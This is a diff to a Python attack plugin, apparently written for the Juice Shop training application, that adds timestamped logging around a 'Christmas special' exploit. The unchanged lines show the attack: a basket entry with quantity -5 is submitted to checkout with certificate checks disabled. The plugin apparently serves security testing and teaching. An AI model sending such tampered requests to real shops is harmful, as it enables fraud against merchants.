@@ -13,6 +13,7 @@
 # RE: You need to have a user account first. (could run login function first)
 #--------------------------------------------------------------------------------------
 
+import time
 from plugins import attack as a
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -82,11 +83,16 @@ class Chrismas_special(pt.paybackTime):
 #NOTES: None
 #--------------------------------------------------------------------------------------
     def run(self):
+        a.logging.basicConfig(filename='./test_logging_info.log', 
+                            level=a.logging.INFO, format='%(asctime)s %(message)s')
+        a.logging.Formatter.converter = time.gmtime
+        a.logging.info('#Christmas Special Started')
         super().addto_basket(quantity=-5, productId=self.productId)
         json_data = super().generator()
         response = self.juice_session.post(self.checkout_url, cookies=self.cookie, headers=self.header, json=json_data,
                                            verify=False)
         print(response.text)
+        a.logging.info('#Christmas Special Finished')
 
 
 
